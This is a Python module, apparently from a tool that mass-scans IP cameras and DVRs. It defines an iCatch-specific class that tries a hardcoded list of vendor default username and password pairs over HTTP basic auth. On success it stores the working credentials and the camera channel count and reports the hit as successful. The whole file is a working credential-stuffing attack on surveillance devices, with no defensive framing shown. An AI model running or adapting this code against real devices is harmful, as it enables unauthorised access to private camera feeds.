import re

import requests

from modules import progress
from modules.networking import http_connect
from modules.paint import green


class ICatch:
    def __init__(self, parent):
        self.ip = parent.data['ip']
        self.port = parent.data['port']
        self.result_queue = parent.result_queue
        self.parent = parent

    def try_for_vuln(self):
        default_credentials = ['admin:123456', 'root:icatch99', ' report:8Jg0SR8K50']
        for cred in default_credentials:
            usr, pwd = cred.split(':')
            if self.connect(usr, pwd):
                return True
        return False

    def get_channels_counter(self, usr, pwd):
        if self.parent.data['authservice'] == 'Basic realm="DVR"':
            path = '/m.html'
        else:
            path = '/m1.html'
        # content = http_connect.basic_auth_check(self.ip, self.port, usr=usr, pwd=pwd, returnall=True, path=path)
        content = requests.get(f'http://{self.ip}:{self.port}{path}', auth=(usr, pwd), verify=False, timeout=3)
        content = content.text
        # print(content)
        content = re.findall('</option>', str(content))
        return len(content)

    def connect(self, usr, pwd):
        if http_connect.basic_auth_check(self.ip, self.port, usr=usr, pwd=pwd):
            self.parent.isDone = True
            self.parent.data['usr'] = usr
            self.parent.data['pwd'] = pwd
            self.parent.data['ch'] = self.get_channels_counter(usr, pwd)
            self.result_queue.put(self.parent.data)
            # self.parent.data =
            # self.result_queue.put({'host': self.ip, 'ip': self.ip, 'vendor': 'Hipcam',
            #                        'usr': usr, 'pwd': pwd, 'device': 'IPCAM', 'vuln':None})
            progress.increment('successful')
            self.parent.sig.change_successful_counter.emit(green(str(progress.get_successful_counter())))
            return True
        else:
            return False
